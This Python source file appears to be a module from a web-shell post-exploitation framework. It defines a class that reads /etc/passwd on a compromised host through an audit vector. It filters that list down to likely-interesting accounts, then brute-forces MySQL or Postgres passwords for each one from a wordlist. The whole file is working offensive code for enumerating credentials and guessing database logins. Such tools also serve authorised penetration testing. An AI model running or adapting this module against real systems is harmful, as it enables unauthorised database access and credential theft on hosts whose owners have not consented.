from core.module import Module
from core.moduleexception import ProbeException, ProbeSucceed
from core.argparse import ArgumentParser
from ast import literal_eval
from core.argparse import SUPPRESS
from os import sep
from string import ascii_lowercase
from random import choice
from re import compile
from sql import Sql

class Sqlusers(Sql):
    """Bruteforce all SQL users"""
    
    def _set_args(self):
    
        self.argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
        self.argparser.add_argument('-wordfile', help='Local wordlist path')
        self.argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
        self.argparser.add_argument('-chunksize', type=int, default=5000)
        self.argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=type([]), default=[])
        self.argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')

    def _set_vectors(self):
        Sql._set_vectors(self)
        self.support_vectors.add_vector('users', 'audit.etcpasswd',  [])


    def _prepare(self):
        
        users = self.support_vectors.get('users').execute()
        filtered_username_list = [u for u in users if 'sql' in u.lower() or 'sql' in users[u].descr.lower() or (users[u].uid == 0) or (users[u].uid > 999) or (('false' not in users[u].shell) and ('/home/' in users[u].home))  ]
        
        self.args['username_list'] = filtered_username_list
        Sql._prepare(self)
              
    def _probe(self):
        
        result = {}
        
        for user in self.args['username_list']:
            self.args['username'] = user
            try:
                Sql._probe(self)
            except ProbeSucceed:
                result[user] = self._result[1]
                self._result = []
        
        self._result = result
          